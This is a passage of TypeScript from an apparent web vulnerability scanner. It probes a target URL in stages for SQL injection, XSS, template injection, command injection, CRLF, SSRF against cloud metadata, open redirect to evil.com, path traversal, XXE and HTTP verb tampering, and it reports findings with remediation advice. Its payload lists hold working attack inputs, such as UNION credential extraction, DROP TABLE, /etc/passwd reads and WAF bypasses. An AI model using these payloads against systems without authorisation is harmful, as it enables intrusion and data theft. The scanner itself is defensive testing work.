    { payload: "' UNION SELECT NULL--", name: "UNION 1-col", type: "union" },
    { payload: "' UNION SELECT NULL,NULL,NULL--", name: "UNION 3-col", type: "union" },
    { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", name: "UNION 5-col", type: "union" },
    { payload: "0 UNION SELECT username,password FROM users--", name: "UNION data exfil", type: "union" },
    // Boolean-blind
    { payload: "' AND 1=1--", name: "Boolean-blind TRUE", type: "blind" },
    { payload: "' AND 1=2--", name: "Boolean-blind FALSE", type: "blind" },
    // Time-based blind
    { payload: "'; WAITFOR DELAY '0:0:3'--", name: "Time-blind MSSQL", type: "time" },
    { payload: "' OR SLEEP(3)--", name: "Time-blind MySQL", type: "time" },
    { payload: "'; SELECT pg_sleep(3)--", name: "Time-blind PostgreSQL", type: "time" },
    // Stacked queries
    { payload: "'; DROP TABLE test--", name: "Stacked query", type: "stacked" },
    // NoSQL injection
    { payload: "{'$gt': ''}", name: "NoSQL MongoDB $gt", type: "nosql" },
    { payload: "{\"$ne\": null}", name: "NoSQL MongoDB $ne", type: "nosql" },
    // WAF bypass
    { payload: "' /*!50000OR*/ '1'='1' --", name: "MySQL version comment bypass", type: "waf-bypass" },
    { payload: "' %4fR '1'='1' --", name: "URL-encoded OR bypass", type: "waf-bypass" },
  ];

  const sqlErrors = [
    /SQL syntax.*?MySQL/i, /Warning.*?mysql_/i, /valid MySQL result/i, /MySqlClient\./i,
    /PostgreSQL.*?ERROR/i, /pg_query\(\)/i, /pg_exec\(\)/i, /PG::SyntaxError/i,
    /Microsoft.*?ODBC.*?SQL Server/i, /\[Microsoft\]\[SQL Server\]/i, /OLE DB.*?SQL Server/i, /mssql_query\(\)/i,
    /ORA-\d{5}/i, /Oracle.*?Driver/i, /oracle\.jdbc/i,
    /SQLite.*?error/i, /SQLITE_ERROR/i, /SQLite3::SQLException/i,
    /SQLSTATE\[/i, /Unclosed quotation mark/i,
    /syntax error at or near/i, /unterminated string/i,
    /quoted string not properly terminated/i,
    /You have an error in your SQL syntax/i,
    /Division by zero/i, /Invalid column name/i,
    /Data type mismatch/i, /Conversion failed/i,
    /java\.sql\.SQLException/i, /JDBC.*?Exception/i,
    /com\.mysql\.jdbc/i, /org\.postgresql/i,
    /unexpected end of SQL command/i, /Dynamic SQL Error/i,
    /Operand type clash/i, /OperationalError/i,
  ];

  // Send payloads across multiple parameter names (wider coverage)
  const injectParams = ["id", "q", "search", "user", "name", "page", "category", "item", "product", "file", "sort", "order", "filter", "type", "action", "key", "token", "ref"];

  let sqliFound = false;
  // Boolean-blind: get baseline response
  let baselineLen = 0;
  const baselineRes = await probeFetch(base);
  if (baselineRes) baselineLen = baselineRes.body.length;

  for (const sqli of sqliPayloads) {
    if (sqliFound) break;
    // Rotate through first 4 param names
    for (const param of injectParams.slice(0, 4)) {
      const testUrl = new URL(base);
      testUrl.searchParams.set(param, sqli.payload);
      const result = await probeFetch(testUrl.toString());
      if (!result) continue;

      // Error-based detection
      for (const pattern of sqlErrors) {
        if (pattern.test(result.body)) {
          findings.push(makeFinding({
            title: `SQL Injection: ${sqli.name}`,
            description: `SQL error signatures detected with "${sqli.name}" payload (${sqli.type} technique). The application passes user input directly to SQL queries without parameterized statements.`,
            severity: "critical", cvss_score: 9.8,
            impact: "Full database compromise — data theft, modification, deletion, privilege escalation, and potential RCE via xp_cmdshell or LOAD_FILE",
            likelihood: "Critical — SQL error signatures confirmed in response",
            remediation: "Use parameterized queries/prepared statements. Implement input validation, WAF rules, and least-privilege DB accounts",
            references: ["https://owasp.org/www-community/attacks/SQL_Injection", "https://portswigger.net/web-security/sql-injection"],
            evidence: `Technique: ${sqli.type}\nParam: ${param}\nPayload: ${sqli.payload}\nPattern: ${pattern.toString()}\n${extractContext(result.body, result.body.match(pattern)?.[0] || "", 200)}`,
            category: "Injection Vulnerability",
          }));
          sqliFound = true; break;
        }
      }
      if (sqliFound) break;

      // Boolean-blind detection (compare TRUE vs FALSE response length difference)
      if (sqli.type === "blind" && sqli.name.includes("TRUE") && baselineLen > 0) {
        const trueLen = result.body.length;
        // Now test FALSE
        const falseUrl = new URL(base);
        falseUrl.searchParams.set(param, "' AND 1=2--");
        const falseResult = await probeFetch(falseUrl.toString());
        if (falseResult) {
          const falseLen = falseResult.body.length;
          const diff = Math.abs(trueLen - falseLen);
          if (diff > 50 && Math.abs(trueLen - baselineLen) < 100) {
            findings.push(makeFinding({
              title: "Boolean-Based Blind SQL Injection Detected",
              description: `Response length differs significantly between TRUE (${trueLen} bytes) and FALSE (${falseLen} bytes) conditions with ${diff} byte difference. This indicates the SQL condition is being evaluated, enabling data extraction one bit at a time.`,
              severity: "critical", cvss_score: 9.1,
              impact: "Full database extraction possible via automated boolean-blind techniques",
              likelihood: "High — significant response difference between TRUE/FALSE conditions",
              remediation: "Use parameterized queries. Boolean-blind SQLi is slower but equally dangerous as error-based",
              references: ["https://portswigger.net/web-security/sql-injection/blind"],
              evidence: `Param: ${param}\nTRUE payload: ' AND 1=1-- (${trueLen} bytes)\nFALSE payload: ' AND 1=2-- (${falseLen} bytes)\nDifference: ${diff} bytes`,
              category: "Injection Vulnerability",
            }));
            sqliFound = true; break;
          }
        }
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 2: CROSS-SITE SCRIPTING (Reflected, DOM-based indicators, Polyglot)
  // ═══════════════════════════════════════════════════════════════════════════

  const xssPayloads = [
    { payload: "<script>alert('XSS_SECURENET')</script>", name: "Classic script tag" },
    { payload: "\"><img src=x onerror=alert(1)>", name: "Attribute breakout img" },
    { payload: "<svg/onload=alert(1)>", name: "SVG onload" },
    { payload: "'-alert(1)-'", name: "JS inline breakout" },
    { payload: "<details open ontoggle=alert(1)>", name: "HTML5 ontoggle" },
    { payload: "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d=\"M0,0\"></textarea></mtext></svg></mglyph></table></mtext></math>", name: "Polyglot mutation XSS" },
    { payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", name: "Polyglot universal" },
    { payload: "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">", name: "HTML entity encoded" },
    { payload: "<iframe srcdoc='<script>alert(1)</script>'>", name: "Iframe srcdoc" },
    { payload: "<input autofocus onfocus=alert(1)>", name: "Input autofocus" },
    { payload: "\"><svg><animate onbegin=alert(1) attributeName=x>", name: "SVG animate" },
    { payload: "${alert(1)}", name: "Template literal injection" },
    { payload: "{{constructor.constructor('alert(1)')()}}", name: "Angular template injection" },
  ];

  let xssFound = false;
  for (const xss of xssPayloads) {
    if (xssFound) break;
    for (const param of ["q", "search", "query", "s", "keyword", "input", "name", "value", "text", "msg", "error", "redirect"]) {
      const testUrl = new URL(base);
      testUrl.searchParams.set(param, xss.payload);
      const result = await probeFetch(testUrl.toString());
      if (!result) continue;

      if (result.body.includes(xss.payload)) {
        findings.push(makeFinding({
          title: `Reflected XSS: ${xss.name}`,
          description: `Payload "${xss.name}" was reflected verbatim in the response without encoding via parameter "${param}". Attackers can craft URLs that execute arbitrary JavaScript in victims' browsers.`,
          severity: "high", cvss_score: 8.2,
          impact: "Session hijacking, credential theft, keylogging, phishing, cryptocurrency mining, malware distribution",
          likelihood: "High — payload reflected without sanitization",
          remediation: "Context-aware output encoding (HTML/JS/URL/CSS). Implement strict CSP. Use auto-escaping template engines",
          references: ["https://owasp.org/www-community/attacks/xss/", "https://portswigger.net/web-security/cross-site-scripting"],
          evidence: `Param: ${param}\nPayload: ${xss.payload}\nReflected at: ${extractContext(result.body, xss.payload, 120)}`,
          category: "Injection Vulnerability",
        }));
        xssFound = true; break;
      }

      // Partial reflection check (WAF may strip some chars but reflect others)
      const stripped = xss.payload.replace(/<\/?script>/gi, "").replace(/on\w+=/gi, "");
      if (stripped.length > 10 && result.body.includes(stripped)) {
        findings.push(makeFinding({
          title: `Partial XSS Reflection Detected (WAF Bypass Possible)`,
          description: `Parts of the XSS payload ("${xss.name}") appear in the response with some dangerous tags stripped. A WAF may be partially filtering input, but bypass is often possible with encoding tricks.`,
          severity: "medium", cvss_score: 6.1,
          impact: "XSS possible with WAF bypass techniques",
          likelihood: "Medium — partial filtering detected",
          remediation: "Don't rely on WAF alone. Implement server-side output encoding at the application level",
          references: ["https://portswigger.net/web-security/cross-site-scripting/contexts"],
          evidence: `Param: ${param}\nOriginal: ${xss.payload.slice(0, 80)}\nReflected partial: ${stripped.slice(0, 80)}`,
          category: "Injection Vulnerability",
        }));
        xssFound = true; break;
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 3: SERVER-SIDE TEMPLATE INJECTION (SSTI)
  // ═══════════════════════════════════════════════════════════════════════════

  const sstiPayloads = [
    { payload: "{{7*7}}", expected: "49", engine: "Jinja2/Twig" },
    { payload: "${7*7}", expected: "49", engine: "FreeMarker/Mako" },
    { payload: "#{7*7}", expected: "49", engine: "Ruby ERB/Java EL" },
    { payload: "<%= 7*7 %>", expected: "49", engine: "ERB/EJS" },
    { payload: "{{7*'7'}}", expected: "7777777", engine: "Jinja2 (string mul)" },
    { payload: "${T(java.lang.Runtime).getRuntime()}", expected: "java.lang.Runtime", engine: "Spring EL" },
    { payload: "{{config}}", expected: "SECRET_KEY", engine: "Flask/Jinja2 config leak" },
    { payload: "{{self.__class__.__mro__}}", expected: "object", engine: "Jinja2 MRO traversal" },
    { payload: "{{request.application.__globals__}}", expected: "builtins", engine: "Jinja2 globals" },
  ];

  for (const ssti of sstiPayloads) {
    const testUrl = new URL(base);
    testUrl.searchParams.set("name", ssti.payload);
    testUrl.searchParams.set("template", ssti.payload);
    const result = await probeFetch(testUrl.toString());
    if (!result) continue;

    if (result.body.includes(ssti.expected) && !result.body.includes(ssti.payload)) {
      findings.push(makeFinding({
        title: `Server-Side Template Injection (${ssti.engine})`,
        description: `The template expression "${ssti.payload}" was evaluated server-side, returning "${ssti.expected}". SSTI allows attackers to execute arbitrary code on the server, leading to full system compromise.`,
        severity: "critical", cvss_score: 9.8,
        impact: "Remote Code Execution — complete server takeover, data exfiltration, lateral movement",
        likelihood: "Critical — template expression was evaluated",
        remediation: "Never pass user input to template engines. Use sandboxed/logic-less templates. Implement strict input validation",
        references: ["https://portswigger.net/web-security/server-side-template-injection", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection"],
        evidence: `Engine: ${ssti.engine}\nPayload: ${ssti.payload}\nExpected: ${ssti.expected}\nFound in response: YES`,
        category: "Injection Vulnerability",
      }));
      break;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 4: COMMAND INJECTION (Advanced)
  // ═══════════════════════════════════════════════════════════════════════════

  const cmdPayloads = [
    { payload: "; cat /etc/passwd", name: "Semicolon chain (Unix)" },
    { payload: "| cat /etc/passwd", name: "Pipe (Unix)" },
    { payload: "& cat /etc/passwd", name: "Background chain (Unix)" },
    { payload: "|| cat /etc/passwd", name: "OR chain (Unix)" },
    { payload: "`cat /etc/passwd`", name: "Backtick injection" },
    { payload: "$(cat /etc/passwd)", name: "Command substitution" },
    { payload: "| dir C:\\", name: "Pipe dir (Windows)" },
    { payload: "& type C:\\windows\\system32\\drivers\\etc\\hosts", name: "Type hosts (Windows)" },
    { payload: ";{cat,/etc/passwd}", name: "Brace expansion bypass" },
    { payload: ";cat${IFS}/etc/passwd", name: "IFS bypass" },
    { payload: "%0acat /etc/passwd", name: "Newline injection" },
  ];
  const cmdSignatures = [/root:.*?:0:0/i, /bin\/(?:bash|sh|zsh)/i, /\buid=\d+/i, /Volume Serial Number/i, /Directory of/i, /\[boot loader\]/i, /localhost/i];

  for (const cmd of cmdPayloads) {
    for (const param of ["cmd", "exec", "command", "run", "ping", "host", "ip", "file", "path", "dir"]) {
      const testUrl = new URL(base);
      testUrl.searchParams.set(param, cmd.payload);
      const result = await probeFetch(testUrl.toString());
      if (!result) continue;
      for (const sig of cmdSignatures) {
        if (sig.test(result.body)) {
          findings.push(makeFinding({
            title: `Command Injection: ${cmd.name}`,
            description: `OS command output detected when using "${cmd.name}" payload via parameter "${param}". User input is being passed directly to system shell commands.`,
            severity: "critical", cvss_score: 9.9,
            impact: "Complete server compromise — arbitrary command execution, data exfiltration, backdoor installation, lateral movement",
            likelihood: "Critical — OS-level output confirmed in response",
            remediation: "Never use shell execution with user input. Use language-native APIs. Implement strict allowlist validation",
            references: ["https://owasp.org/www-community/attacks/Command_Injection", "https://portswigger.net/web-security/os-command-injection"],
            evidence: `Param: ${param}\nPayload: ${cmd.payload}\nMatched: ${sig.toString()}`,
            category: "Injection Vulnerability",
          }));
          break;
        }
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 5: CRLF / HTTP HEADER INJECTION
  // ═══════════════════════════════════════════════════════════════════════════

  const crlfPayloads = [
    "%0d%0aX-Injected: SecureNetTest",
    "%0d%0aSet-Cookie: securenet=injected",
    "%0d%0a%0d%0a<script>alert('CRLF')</script>",
    "\r\nX-Injected: SecureNetTest",
  ];
  for (const crlf of crlfPayloads) {
    const testUrl = `${base}/${crlf}`;
    const result = await probeFetch(testUrl, { redirect: "manual" });
    if (!result) continue;
    const injected = result.headers.get("x-injected") || "";
    const setCookie = result.headers.get("set-cookie") || "";
    if (injected.includes("SecureNetTest") || setCookie.includes("securenet=injected")) {
      findings.push(makeFinding({
        title: "CRLF / HTTP Header Injection Detected",
        description: "The server allows injection of arbitrary HTTP headers via CRLF sequences (\\r\\n). Attackers can set cookies, perform cache poisoning, or inject response bodies.",
        severity: "high", cvss_score: 7.5,
        impact: "Session fixation via cookie injection, HTTP response splitting, cache poisoning, XSS via body injection",
        likelihood: "High — injected headers confirmed in response",
        remediation: "Strip or reject CRLF characters (\\r\\n) from all user-supplied input used in HTTP headers or redirects",
        references: ["https://owasp.org/www-community/vulnerabilities/CRLF_Injection", "https://portswigger.net/web-security/request-smuggling"],
        evidence: `Payload: ${crlf}\nInjected header confirmed in response`,
        category: "Injection Vulnerability",
      }));
      break;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 6: SSRF (Server-Side Request Forgery) PROBING
  // ═══════════════════════════════════════════════════════════════════════════

  const ssrfTargets = [
    { url: "http://169.254.169.254/latest/meta-data/", name: "AWS Metadata (IMDSv1)", sig: /ami-id|instance-id|instance-type/i },
    { url: "http://metadata.google.internal/computeMetadata/v1/", name: "GCP Metadata", sig: /project-id|instance\/zone/i },
    { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", name: "Azure Metadata", sig: /vmId|subscriptionId/i },
    { url: "http://127.0.0.1:80/", name: "Localhost probe", sig: /<html|<head|<body/i },
    { url: "http://[::1]:80/", name: "IPv6 localhost", sig: /<html|<head|<body/i },
  ];

  for (const ssrf of ssrfTargets) {
    for (const param of ["url", "uri", "path", "src", "href", "link", "target", "dest", "redirect", "fetch", "load", "proxy", "callback"]) {
      const testUrl = new URL(base);
      testUrl.searchParams.set(param, ssrf.url);
      const result = await probeFetch(testUrl.toString());
      if (!result) continue;
      if (ssrf.sig.test(result.body)) {
        findings.push(makeFinding({
          title: `SSRF: ${ssrf.name} Accessible`,
          description: `The application fetched an internal resource (${ssrf.url}) when the URL was passed via parameter "${param}". SSRF enables attackers to access internal services, cloud metadata, and private networks.`,
          severity: "critical", cvss_score: 9.6,
          impact: "Cloud credential theft (IAM roles), internal network scanning, access to databases and admin panels behind the firewall",
          likelihood: "Critical — internal resource content returned in response",
          remediation: "Validate and allowlist URLs. Block requests to private IPs, cloud metadata, and internal hosts. Use SSRF-safe HTTP clients",
          references: ["https://portswigger.net/web-security/ssrf", "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
          evidence: `Param: ${param}\nTarget: ${ssrf.url}\nSignature matched: ${ssrf.sig.toString()}`,
          category: "Injection Vulnerability",
        }));
        break;
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 7: OPEN REDIRECT (Advanced bypasses)
  // ═══════════════════════════════════════════════════════════════════════════

  const redirectPayloads = [
    "https://evil.com", "//evil.com", "/\\evil.com", "////evil.com",
    "https://evil.com@trusted.com", "https://trusted.com.evil.com",
    "//evil.com/%2f..", "///evil.com", "/%09/evil.com",
    "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
    "/\\\\evil.com", "https:%5c%5cevil.com",
  ];

  for (const target of redirectPayloads) {
    for (const param of ["url", "redirect", "next", "return", "returnTo", "goto", "continue", "dest", "destination", "redir", "redirect_uri", "callback"]) {
      const testUrl = new URL(base);
      testUrl.searchParams.set(param, target);
      const result = await probeFetch(testUrl.toString(), { redirect: "manual" });
      if (!result) continue;
      const location = result.headers.get("location") || "";
      if (location.includes("evil.com") || (target.startsWith("javascript:") && [301, 302, 303, 307, 308].includes(result.status) && location.includes("javascript:"))) {
        findings.push(makeFinding({
          title: "Open Redirect Vulnerability",
          description: `The application redirects to attacker-controlled destination "${target}" via parameter "${param}". This enables phishing attacks using your trusted domain as the launch URL.`,
          severity: "medium", cvss_score: 6.1,
          impact: "Phishing attacks, OAuth token theft via redirect_uri manipulation, reputation damage",
          likelihood: "High — redirect confirmed to attacker domain",
          remediation: "Validate redirect destinations against a strict allowlist. Use relative paths only. Never redirect to user-provided URLs",
          references: ["https://portswigger.net/web-security/open-redirection", "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"],
          evidence: `Param: ${param}\nPayload: ${target}\nLocation: ${location}`,
          category: "Injection Vulnerability",
        }));
        break;
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 8: PATH TRAVERSAL (Advanced encodings)
  // ═══════════════════════════════════════════════════════════════════════════

  const traversalPayloads = [
    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd", "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd", "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%00/etc/passwd", "....\\\\....\\\\etc/passwd",
    "/etc/passwd%00.jpg", "..;/..;/..;/etc/passwd",
  ];
  const fileSignatures = [/root:.*?:0:0/, /\[boot loader\]/i, /\[extensions\]/i, /daemon:.*?:1:1/, /www-data/i];

  for (const payload of traversalPayloads) {
    // Test in URL path
    const result1 = await probeFetch(`${base}/${payload}`);
    if (result1) {
      for (const sig of fileSignatures) {
        if (sig.test(result1.body)) {
          findings.push(makeFinding({
            title: "Path Traversal (LFI) Vulnerability",
            description: `System file content returned when using traversal payload "${payload}". Attackers can read any file accessible to the web server process.`,
            severity: "critical", cvss_score: 9.1,
            impact: "Read /etc/passwd, /etc/shadow, application source code, database credentials, SSH keys, cloud credentials",
            likelihood: "Critical — file content confirmed in response",
            remediation: "Use chroot jails. Validate file paths against allowlist. Strip .. sequences and null bytes. Use realpath() validation",
            references: ["https://portswigger.net/web-security/file-path-traversal", "https://owasp.org/www-community/attacks/Path_Traversal"],
            evidence: `Payload: ${payload}\nMatched: ${sig.toString()}`,
            category: "Injection Vulnerability",
          }));
          break;
        }
      }
    }

    // Test in query parameter
    for (const param of ["file", "path", "page", "include", "template", "doc", "folder", "load"]) {
      const testUrl = new URL(base);
      testUrl.searchParams.set(param, payload);
      const result2 = await probeFetch(testUrl.toString());
      if (!result2) continue;
      for (const sig of fileSignatures) {
        if (sig.test(result2.body)) {
          findings.push(makeFinding({
            title: "Local File Inclusion (LFI) via Parameter",
            description: `Parameter "${param}" is vulnerable to path traversal. System file content returned for payload "${payload}".`,
            severity: "critical", cvss_score: 9.3,
            impact: "Arbitrary file read — credentials, source code, configuration files, potential RCE via log poisoning",
            likelihood: "Critical — system file content confirmed",
            remediation: "Never use user input in file paths. Implement strict allowlisting and path canonicalization",
            references: ["https://owasp.org/www-community/attacks/Path_Traversal"],
            evidence: `Param: ${param}\nPayload: ${payload}\nMatched: ${sig.toString()}`,
            category: "Injection Vulnerability",
          }));
          break;
        }
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 9: HTTP VERB TAMPERING & METHOD OVERRIDE
  // ═══════════════════════════════════════════════════════════════════════════

  const protectedPaths = ["/admin", "/api/admin", "/dashboard", "/settings", "/config", "/users"];
  for (const path of protectedPaths) {
    // Test if changing HTTP method bypasses auth
    const getResult = await probeFetch(`${base}${path}`);
    if (getResult && (getResult.status === 401 || getResult.status === 403)) {
      // Try other methods
      for (const method of ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]) {
        const altResult = await probeFetch(`${base}${path}`, { method });
        if (altResult && altResult.status === 200) {
          findings.push(makeFinding({
            title: `HTTP Verb Tampering: ${path}`,
            description: `The path "${path}" returns 403 for GET but 200 for ${method}. This suggests authentication checks are only applied to GET requests, allowing bypass via alternative HTTP methods.`,
            severity: "high", cvss_score: 7.5,
            impact: "Authentication bypass — access to admin panels and protected functionality",
            likelihood: "High — method-based bypass confirmed",
            remediation: "Apply authentication checks regardless of HTTP method. Use framework-level auth middleware that covers all methods",
            references: ["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering"],
            evidence: `GET ${path} → ${getResult.status}\n${method} ${path} → ${altResult.status}`,
            category: "Injection Vulnerability",
          }));
          break;
        }
      }

      // Test X-HTTP-Method-Override
      const overrideResult = await probeFetch(`${base}${path}`, {
        method: "POST",
        headers: { "X-HTTP-Method-Override": "GET", "X-Method-Override": "GET", "X-HTTP-Method": "GET" },
      });
      if (overrideResult && overrideResult.status === 200) {
        findings.push(makeFinding({
          title: `Method Override Bypass: ${path}`,
          description: `Authentication on "${path}" can be bypassed using X-HTTP-Method-Override header.`,
          severity: "high", cvss_score: 7.5,
          impact: "Authentication bypass via method override headers",
          likelihood: "High — override header accepted",
          remediation: "Disable X-HTTP-Method-Override support or apply auth checks after method resolution",
          references: ["https://owasp.org/www-project-web-security-testing-guide/"],
          evidence: `POST ${path} with X-HTTP-Method-Override: GET → ${overrideResult.status}`,
          category: "Injection Vulnerability",
        }));
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 10: XXE INDICATORS (XML External Entity)
  // ═══════════════════════════════════════════════════════════════════════════

  const xxePayload = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>`;
  const xxeEndpoints = ["/api/xml", "/api/upload", "/api/import", "/api/parse", "/xmlrpc.php", "/soap", "/api/data"];

  for (const endpoint of xxeEndpoints) {
    const result = await probeFetch(`${base}${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/xml" },
      body: xxePayload,
    });
    if (!result) continue;
    if (/root:.*?:0:0/.test(result.body) || /SYSTEM.*?entity/i.test(result.body)) {
      findings.push(makeFinding({
        title: "XML External Entity (XXE) Injection",
        description: "The application processes XML input with external entity resolution enabled. An attacker can read arbitrary files, perform SSRF, or cause Denial of Service.",
        severity: "critical", cvss_score: 9.1,
        impact: "Arbitrary file read, SSRF via external entities, Denial of Service via billion laughs attack, port scanning",
        likelihood: "Critical — XXE payload was processed",
        remediation: "Disable external entity processing in your XML parser. Use JSON instead of XML where possible",
        references: ["https://portswigger.net/web-security/xxe", "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
        evidence: `Endpoint: ${endpoint}\nPayload: XXE with file:///etc/passwd\nSystem file content detected in response`,
        category: "Injection Vulnerability",
      }));
      break;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 11: HTTP PARAMETER POLLUTION
  // ═══════════════════════════════════════════════════════════════════════════

  const hppUrl = new URL(base);
  hppUrl.searchParams.append("id", "1");
  hppUrl.searchParams.append("id", "2 OR 1=1--");
  const hppResult = await probeFetch(hppUrl.toString());
  if (hppResult) {
    for (const pattern of sqlErrors) {
      if (pattern.test(hppResult.body)) {
        findings.push(makeFinding({
          title: "HTTP Parameter Pollution + SQLi",
          description: "The application is vulnerable to HTTP Parameter Pollution — when the same parameter is sent twice, the server processes the duplicate value, which can bypass WAF rules and input validation.",
          severity: "high", cvss_score: 8.0,
          impact: "WAF bypass, input validation bypass, logic manipulation, combined with SQLi for full database access",
          likelihood: "High — duplicate parameter processed with SQL error",
          remediation: "Use only the first occurrence of each parameter. Implement server-side deduplication",
          references: ["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"],
          evidence: `Sent id=1&id=2 OR 1=1--\nSQL error pattern matched in response`,
          category: "Injection Vulnerability",
        }));
        break;
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 12: WAF DETECTION
  // ═══════════════════════════════════════════════════════════════════════════

  const wafPayload = "<script>alert(1)</script>' OR 1=1--";
  const wafUrl = new URL(base);
  wafUrl.searchParams.set("test", wafPayload);
  const wafResult = await probeFetch(wafUrl.toString());
  if (wafResult) {
    const wafSignatures = [
      { pattern: /cloudflare/i, name: "Cloudflare WAF" },
      { pattern: /akamai/i, name: "Akamai WAF" },
      { pattern: /sucuri/i, name: "Sucuri WAF" },
      { pattern: /mod_security|modsecurity/i, name: "ModSecurity" },
      { pattern: /imperva|incapsula/i, name: "Imperva/Incapsula" },
      { pattern: /aws[- ]waf/i, name: "AWS WAF" },
      { pattern: /f5|bigip/i, name: "F5 BIG-IP" },
      { pattern: /barracuda/i, name: "Barracuda WAF" },
      { pattern: /fortiweb|fortigate/i, name: "Fortinet WAF" },
      { pattern: /wordfence/i, name: "Wordfence (WordPress)" },
    ];
    const serverHeader = wafResult.headers.get("server") || "";
    const allHeaders = Array.from(wafResult.headers.entries()).map(([k, v]) => `${k}: ${v}`).join("\n");
    const combined = `${serverHeader} ${allHeaders} ${wafResult.body.slice(0, 5000)}`;

    for (const waf of wafSignatures) {
      if (waf.pattern.test(combined)) {
        findings.push(makeFinding({
          title: `WAF Detected: ${waf.name}`,
          description: `A Web Application Firewall (${waf.name}) was detected protecting this application. While WAFs add a security layer, they should not be the sole defense. Application-level security is still essential.`,
          severity: "info", cvss_score: 0,
          impact: "WAF provides defense-in-depth but can often be bypassed with encoding tricks",
          likelihood: "Info — WAF presence confirmed",
          remediation: "Good — WAF provides an additional security layer. Ensure application-level input validation is also implemented",
          references: ["https://owasp.org/www-community/Web_Application_Firewall"],
          evidence: `WAF: ${waf.name}\nDetected via: ${waf.pattern.toString()}`,
          category: "Injection Vulnerability",
        }));
        break;
      }
    }

    // No WAF detected
    if (wafResult.status === 200 && !wafSignatures.some(w => w.pattern.test(combined))) {
      findings.push(makeFinding({
        title: "No Web Application Firewall (WAF) Detected",
        description: "No WAF was detected protecting this application. Attack payloads were not blocked or filtered at the network level. The application relies solely on application-level security.",
        severity: "medium", cvss_score: 4.0,
        impact: "No network-level protection against automated attacks, SQLi, XSS, and other injection attacks",
        likelihood: "Medium — no WAF means attacks reach the application directly",
        remediation: "Deploy a WAF (Cloudflare, AWS WAF, ModSecurity) as an additional defense layer. Do NOT rely on WAF as the only protection",
        references: ["https://owasp.org/www-community/Web_Application_Firewall"],
        evidence: `Test payload sent (combined SQLi+XSS) — no WAF signatures in response headers or body`,
        category: "Injection Vulnerability",
      }));
    }
  }

  return findings;
}

// ── Module 10: JavaScript Rendering & Client-Side Security ───────────────────

function analyzeJSRendering(body: string, url: string): Finding[] {
  const findings: Finding[] = [];
  if (!body) return findings;

  // Detect SPA frameworks
  const spaFrameworks = [
    { pattern: /id\s*=\s*["'](?:__next)["']/i, name: "Next.js" },
    { pattern: /id\s*=\s*["'](?:__nuxt)["']/i, name: "Nuxt.js" },
    { pattern: /id\s*=\s*["'](?:app|root)["']/i, name: "React/Vue SPA" },
    { pattern: /ng-app|ng-controller|ng-model/i, name: "AngularJS (Legacy)" },
    { pattern: /<app-root/i, name: "Angular" },
    { pattern: /data-v-[a-f0-9]{8}/i, name: "Vue.js" },
    { pattern: /data-svelte/i, name: "Svelte/SvelteKit" },
    { pattern: /ember-view|data-ember/i, name: "Ember.js" },
    { pattern: /_app\.js|_next\/static/i, name: "Next.js Bundle" },
    { pattern: /_nuxt\/|__NUXT__/i, name: "Nuxt.js Bundle" },
  ];

  const detected: string[] = [];
  for (const fw of spaFrameworks) {
    if (fw.pattern.test(body)) detected.push(fw.name);
  }

  // SSR hydration markers
  const ssrMarkers = [
    /window\.__NEXT_DATA__/, /window\.__NUXT__/, /window\.__INITIAL_STATE__/,
    /data-reactroot/, /data-server-rendered/i, /<!--\s*-->/, // React SSR comment markers
  ];
  const hasSSR = ssrMarkers.some(p => p.test(body));

  // Extract visible text (strip scripts, styles, tags)
  const bodyMatch = body.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
  const rawContent = bodyMatch ? bodyMatch[1] : body;
  const visibleText = rawContent
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/<[^>]+>/g, "")
    .replace(/\s+/g, " ")
    .trim();

  if (detected.length > 0 && visibleText.length < 200 && !hasSSR) {
    findings.push(makeFinding({
      title: "Client-Side Only Rendering (No SSR)",
      description: `Detected ${detected.join(", ")} framework(s) with only ${visibleText.length} characters of server-rendered text and no SSR hydration markers. Content is rendered entirely via JavaScript, meaning: (1) Security scanners cannot analyze dynamic content, (2) SEO is severely impacted, (3) Users with JavaScript disabled see a blank page.`,
      severity: "medium", cvss_score: 5.3,
      impact: "Hidden dynamic content may contain security vulnerabilities not detected by static analysis",
      likelihood: "Medium — content loaded after initial page render",
